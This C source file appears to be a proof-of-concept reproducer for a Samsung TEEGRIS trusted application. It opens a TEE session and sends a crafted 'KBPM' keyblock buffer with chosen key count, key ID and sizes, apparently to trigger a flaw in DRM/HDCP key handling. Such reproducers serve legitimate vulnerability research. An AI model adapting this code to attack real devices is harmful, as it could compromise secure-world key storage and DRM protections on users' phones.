#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

uint32_t load_hdcpkey(TEEC_Context *context, TEEC_Session *session)
{

    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT, TEEC_NONE,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].value.a = 1234;  // the keyblock buffer
    op.params[0].value.b =  1234;
    uint32_t err_origin;

    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0xc, &op, &err_origin);
    return 0;
}

void send_req(TEEC_Context *context, TEEC_Session *session)
{
    void* mem_area1 = malloc(0x1000);
    memset(mem_area1, 0, 0x1000);
    int* int_mem_area = (int*)mem_area1;
    *(uint8_t *)(mem_area1) = 0x4B;
    *(uint8_t *)(mem_area1 + 1) = 0x42;
    *(uint8_t *)(mem_area1 + 2) = 0x50;
    *(uint8_t *)(mem_area1 + 3) = 0x4D;
    int_mem_area[17] = 2; //keycount
    int_mem_area[18] = 0x1337; // drmKeyId
    
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
    op.params[0].tmpref.buffer = mem_area1;  // the keyblock buffer
    op.params[0].tmpref.size =  0x370; 
    op.params[1].tmpref.buffer = (void*)malloc(0x1000);  // the keyblock buffer
    op.params[1].tmpref.size =  0x100; 
    uint32_t err_origin;

    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x0, &op, &err_origin);
}


int main(int argc, char **argv)
{
    char* ta = "14b0aad8-c011-4a3f-b66aca8d0e66f273";
    TEEC_UUID *uuid = teegris_uuid(ta);

    TEEC_Context context;
    TEEC_Session session;
    uint32_t err_origin;
    TEEC_Result res;

    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    // write banner
    printf("[+] drm query...\n");
    send_req(&context, &session);
    printf("[+] done...\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
